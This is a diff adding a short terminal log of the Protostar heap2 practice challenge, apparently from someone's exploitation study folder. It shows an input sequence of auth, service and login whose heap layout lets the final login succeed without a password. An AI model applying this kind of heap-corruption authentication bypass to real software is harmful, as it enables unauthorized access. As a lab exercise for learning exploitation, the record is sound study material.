@@ -1,0 +1,12 @@
+levihackerman@LAPTOP-G48HOSEM:~/rev-pwn/nightmare-remix/unit-heap/protostar-heap2$ ./heap2
+[ auth = (nil), service = (nil) ]
+auth zamnzamn
+[ auth = 0x562f57755ac0, service = (nil) ]
+login
+please enter your password
+[ auth = 0x562f57755ac0, service = (nil) ]
+service A
+[ auth = 0x562f57755ac0, service = 0x562f57755ae0 ]
+login
+you have logged in already!
+[ auth = 0x562f57755ac0, service = 0x562f57755ae0 ]
